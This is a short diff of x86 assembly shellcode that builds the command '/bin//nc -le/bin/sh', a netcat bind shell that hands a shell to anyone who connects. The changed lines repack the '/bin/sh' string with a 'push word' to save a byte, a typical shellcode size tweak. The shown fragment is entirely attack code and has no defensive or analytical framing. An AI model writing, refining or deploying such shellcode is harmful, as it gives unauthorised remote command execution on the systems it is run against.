@@ -17,8 +17,8 @@ _start:
 	push 0x6e69622f ; '/bin'
 	mov ebx, esp	; EBX points to '/bin//nc'
 	push edx
-	push 0x68732f2f ; '//sh'
-	push 0x6e69622f ; '/bin'
+	push word 0x6873 ; 'sh' -> Saving 1 byte by using push word! 
+	push 0x2f6e6962 ; 'bin/'
 	push 0x2f656c2d ; '-le/'
 	mov esi, esp
 	push edx
